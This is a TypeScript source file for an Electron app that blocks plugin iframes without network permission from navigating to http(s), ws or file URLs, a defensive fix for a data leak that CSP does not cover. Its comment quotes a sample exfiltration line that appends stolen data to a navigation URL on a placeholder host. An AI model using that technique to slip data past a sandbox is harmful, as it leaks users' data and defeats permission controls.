import { app } from 'electron'
import type { Event, WebContents } from 'electron'
import { pluginManagerService } from '../services/pluginManagerService'

/**
 * 插件 iframe 导航守卫（补齐 protocols.ts 里 CSP 覆盖不到的一条外传路径）。
 *
 * CSP 的 default-src 只约束 fetch / img / connect / script 等子资源，**不管辖导航**。
 * 因此没有 network 权限的插件仍可执行 `location.href = 'https://x/?d=' + 窃取数据`
 * 把消息塞进 URL 外传。这里在导航层面拦下：ct-plugin:// 源的帧若无 network 权限，
 * 只允许在下列协议内导航，跳向 http(s)/ws/file 等一律阻止。
 *
 * 挂在 web-contents-created 上，主窗口与插件独立窗口里的插件 iframe 一并覆盖。
 * window.open 已被 iframe 的 sandbox（无 allow-popups）封死，无需另行处理。
 */
const SAFE_NAV_PROTOCOLS = new Set(['ct-plugin:', 'ct-plugin-media:', 'data:', 'blob:', 'about:'])

function pluginIdOfFrame(frameUrl: string | undefined): string | null {
  if (!frameUrl) return null
  try {
    const u = new URL(frameUrl)
    return u.protocol === 'ct-plugin:' ? u.hostname : null
  } catch {
    return null
  }
}

function guardNavigation(currentUrl: string | undefined, targetUrl: string, event: Event): void {
  const pluginId = pluginIdOfFrame(currentUrl)
  if (!pluginId) return // 非插件 origin（宿主自身页面）：放行
  if (pluginManagerService.hasPermission(pluginId, 'network')) return // 已授 network：放行
  let protocol: string
  try {
    protocol = new URL(targetUrl).protocol
  } catch {
    return
  }
  if (SAFE_NAV_PROTOCOLS.has(protocol)) return
  event.preventDefault()
  console.warn(`[PluginGuard] 阻止无 network 权限插件 "${pluginId}" 导航外传：${targetUrl}`)
}

export function registerPluginNavigationGuard(): void {
  app.on('web-contents-created', (_e, wc: WebContents) => {
    // 插件跑在子 iframe，自导航触发 will-frame-navigate（含主帧导航也会触发）
    wc.on('will-frame-navigate', (event) => {
      const e = event as Event & { url: string; frame?: { url?: string } }
      guardNavigation(e.frame?.url, e.url, e)
    })
    // 兜底：万一插件成为顶层文档（如未来直接窗口加载 ct-plugin://）
    wc.on('will-navigate', (event, url) => {
      guardNavigation(wc.getURL(), url, event)
    })
  })
}
